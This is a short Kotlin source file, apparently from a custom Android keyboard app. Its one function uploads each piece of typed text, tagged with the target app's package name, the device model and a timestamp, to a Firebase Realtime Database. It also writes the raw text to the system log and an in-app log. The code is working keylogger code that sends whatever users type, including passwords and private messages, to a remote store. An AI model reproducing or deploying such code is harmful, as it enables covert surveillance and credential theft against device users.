package com.example.mykeyboard

import android.os.Build
import android.util.Log
import com.google.firebase.database.FirebaseDatabase
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class FirebaseSyncManager {
    companion object {
        private const val TAG = "FirebaseSyncManager"
        private val scope = CoroutineScope(Dispatchers.IO)

        fun logKeystroke(text: String, packageName: String?) {
            scope.launch {
                try {
                    val database = FirebaseDatabase.getInstance()
                    val deviceName = Build.MODEL?.replace(Regex("[^a-zA-Z0-9_-]"), "_")?.ifBlank { "Unknown_Device" } ?: "Unknown_Device"
                    val ref = database.getReference().child(deviceName).child("keystrokes_batches")
                    val appName = (packageName ?: "unknown.app").replace(Regex("[^a-zA-Z0-9_-]"), "_")
                    val timestampKey = SimpleDateFormat("yyyy-MM-dd_HH-mm-ss_SSS", Locale.getDefault()).format(Date())

                    val logData = mapOf(
                        "deviceName" to deviceName,
                        "appName" to appName,
                        "timestamp" to System.currentTimeMillis(),
                        "typedContent" to text
                    )

                    ref.child(appName).child(timestampKey).setValue(logData)
                        .addOnSuccessListener {
                            Log.d(TAG, "Keystroke synced successfully: $text")
                            LogStore.addLog("[$deviceName] Keystroke synced ($appName): $text")
                        }
                        .addOnFailureListener { e: Exception ->
                            Log.e(TAG, "Failed to sync keystroke", e)
                            LogStore.addLog("[$deviceName] Keystroke sync FAILED: ${e.toString()}")
                        }
                } catch (e: Exception) {
                    Log.e(TAG, "Exception in logKeystroke", e)
                    LogStore.addLog("Keystroke exception: ${e.toString()}")
                }
            }
        }
    }
}
